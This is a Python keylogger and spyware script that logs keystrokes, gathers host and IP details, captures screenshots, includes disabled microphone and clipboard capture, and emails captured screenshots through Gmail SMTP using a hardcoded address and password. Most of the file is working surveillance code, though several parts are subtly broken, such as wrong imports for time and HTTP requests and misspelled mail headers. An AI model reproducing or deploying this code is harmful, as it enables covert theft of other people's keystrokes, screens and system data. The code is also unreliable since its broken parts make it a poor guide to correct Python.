from datetime import time
from webbrowser import get

import pynput
from numpy.distutils.system_info import default_src_dirs
from pynput.keyboard import Key, Listener

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

#import win32clipboard
from scipy.io.wavfile import write
import sounddevice as sd

from multiprocessing import Process, freeze_support
from PIL import ImageGrab




keys_information = "key_log.txt"
sys_information = "sys_info.txt"
clipboard_information = "clip_info.txt"
sound_information = "audio.wav"
image_infomation = "screenshot.png"

from_addr = "tharilaki82@gmail.com"
toaddress = "tharilaki82@gmail.com"
password = "wstqisdjuuvmgphe"
body = "hiiiii"

path = "/home/tharindu/Desktop/Keylogger/project"
extend = "/"

frequency = 44100
microphone_time = 5


def send_email(filename, attachment, toaddress):

    msg = MIMEMultipart()

    msg['From'] = from_addr
    msg['To'] = toaddress
    msg['Subject'] = "Log file"

    body = "This is the body"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octed-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Desposion', "attachment; filename %s" %filename)
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(from_addr, password)
    text = msg.as_string()
    s.sendmail(from_addr, toaddress, text)
    s.quit()

def system_info():
    with open(path + extend + sys_information, "a") as f:
        hostname = socket.gethostname()
        IPAddress = socket.gethostbyname(hostname)

        try:
            public_IP = get("https://api.ipify.org").text
            f.write("Public IP Address : "+public_IP)
        except Exception:
            f.write("Couldn't get public IP Address\n")
        f.write("Host Name : "+hostname+"\n")
        f.write("Private IP Address : "+IPAddress+"\n")
        f.write("Processor info : "+platform.processor()+"\n")
        f.write("System info : " + platform.system() + "\n")
        f.write("Version info : " + platform.version() + "\n")
        f.write("Machine info : " + platform.machine() + "\n")

        f.close()

system_info()

# def clipboard_info():
#     with open(path + extend + clipboard_information, "a") as f:
#         try:
#             win32clipboard.OpenClipboard()
#             f.write(win32clipboard.GetClipboardData())
#         except Exception:
#             f.write("Can't get clipboard data\n")
#
#         win32clipboard.CloseClipboard()

def sound_info(fs, seconds):
    my_recording = sd.rec(int(seconds*fs), samplerate=fs, channels=2)
    sd.wait()
    write(path + extend + sound_information, fs, my_recording)

#sound_info(frequency, microphone_time)

def image_info():
    im = ImageGrab.grab()
    im.save(path + extend + image_infomation)

image_info()

time_iteration = 15
number_of_interation =0
current_time = time.time()
stopping_time = time.time() + time_iteration
number_of_interation_end = 3



while number_of_interation < number_of_interation_end:
    keys = []

    def press(key):
        global keys, current_time
        keys.append(key)
        current_time = time.time()
        write_file(keys)
        keys =[]

    def release(key):
        if key == Key.esc:
            #clipboard_info()
            #send_email(keys_information, path + extend + keys_information, toaddress)
            #send_email(sys_information, path + extend + sys_information, toaddress)
            return False
        if current_time>stopping_time:
            return False

    def write_file(keys):
        with open(path + extend + keys_information, "a") as f:
            for key in keys:
                if key == Key.space:
                    f.write('\n')
                elif hasattr(key, 'char'):
                    f.write(key.char)
                else:
                    f.write("["+str(key)+"]\n")



    with Listener(on_press=press, on_release=release) as listener:
        listener.join()

    if current_time > stopping_time:
         with open(path + extend + keys_information, "w") as f:
             f.write(" ")

         image_info()
         send_email(image_infomation, path+extend+image_infomation,toaddress)

         #clipboard_info()

         number_of_interation += 1
         current_time = time.time()
         stopping_time = time.time() + time_iteration